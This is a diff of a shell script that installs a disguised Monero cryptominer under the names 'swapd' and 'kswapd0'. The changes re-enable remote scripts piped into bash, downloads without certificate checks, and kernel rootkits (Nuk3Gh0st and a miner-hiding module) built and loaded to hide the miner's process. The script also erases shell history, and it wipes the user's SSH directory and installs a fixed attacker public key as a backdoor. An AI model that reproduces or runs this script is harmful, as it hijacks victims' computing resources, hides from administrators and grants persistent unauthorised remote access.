@@ -4,23 +4,23 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-1))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-systemctl disable gdm2 --now
-systemctl disable swapd --now
+#systemctl disable gdm2 --now
+#systemctl disable swapd --now
 
-chattr -i $HOME/.gdm2/
-chattr -i $HOME/.gdm2/config.json
+#chattr -i $HOME/.gdm2/
+#chattr -i $HOME/.gdm2/config.json
 
-chattr -i $HOME/.swapd/
-chattr -i $HOME/.swapd/config.json
+#chattr -i $HOME/.swapd/
+#chattr -i $HOME/.swapd/config.json
 
-killall swapd
-kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+#killall swapd
+#kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
-killall kswapd0
-kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+#killall kswapd0
+#kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
 
-rm -rf $HOME/.gdm2/
-rm -rf $HOME/.swapd/
+#rm -rf $HOME/.gdm2/
+#rm -rf $HOME/.swapd/
 
 VERSION=2.11
 
@@ -40,7 +40,7 @@ EMAIL=$2 # this one is optional
 echo "[*] #executing #BotKiller..."
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
-# curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
+curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
 
 echo "[*] #checking prerequisites..."
 
@@ -182,8 +182,8 @@ killall -9 kswapd0
 echo "[*] Removing previous directories..."
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-rm -rf $HOME/.gdm2
-rm -rf $HOME/.swapd
+#rm -rf $HOME/.gdm2
+#rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -191,7 +191,7 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig
   exit 1
 fi
 
-# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
 [ -d $HOME/.swapd ] || mkdir $HOME/.swapd
@@ -199,7 +199,7 @@ if ! tar xf xmrig.tar.gz -C $HOME/.swapd; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
   exit 1
 fi
-rm xmrig.tar.gz
+#rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
@@ -225,7 +225,7 @@ if (test $? -ne 0); then
   if ! tar xf xmrig.tar.gz -C $HOME/.swapd --strip=1; then
     echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
   fi
-  rm xmrig.tar.gz
+  #rm xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
@@ -270,9 +270,11 @@ sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.swapd/config.json
 
-#echo "[*] Copying xmrig-proxy config"
+
+echo "[*] Copying xmrig-proxy config"
 
 mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
+
 
 #cd $HOME/.swapd/ ; touch config.json ; cat config.json <<EOL
 #{
@@ -312,7 +314,7 @@ EOL
 
 chmod +x $HOME/.swapd/swapd.sh
 
-#echo "[*] #preparing script background work and work under reboot..."
+echo "[*] #preparing script background work and work under reboot..."
 
 if ! sudo -n true 2>/dev/null; then
   if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
@@ -365,9 +367,6 @@ EOL
   fi
 fi
 
-echo "[*] #Installing r00tkit(z)"
-#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
@@ -386,9 +385,12 @@ else
 fi
 echo ""
 
+echo "[*] #Installing r00tkit(z)"
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+
 echo "[*] Determining GPU+CPU (without lshw)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt-get install pciutils -y; update-pciids ; lspci -vs 00:01.0 ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
-# cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
+cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 echo "[*] Determining GPU+CPU"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install msr-tools pciutils lshw -y; apt-get install msr-tools pciutils lshw -y ; zypper install msrtools pciutils lshw -y ; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
@@ -405,8 +407,8 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm
 echo "[*] Nuk3Gh0st..."
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
-#echo "[*] hide crypto miner."
-#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf hiding-cryptominers-linux-rootkit ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
+echo "[*] hide crypto miner."
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf hiding-cryptominers-linux-rootkit ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
 
 
 optimize_func() {
@@ -480,20 +482,22 @@ echo "[*] hid1ng... ;)"
 
 kill -31 $(pgrep -f -u root config.json)
 
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
+kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ;
+kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
-kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
+kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` :
+kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
 rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autoremove -y;
 
-rm -rf xmrig*
+rm -rf xmrig* config.json*
 
 
 echo "[*] Generating ssh key on server"
 
-cd ~ && rm -rf .ssh && mkdir .ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
+cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
 
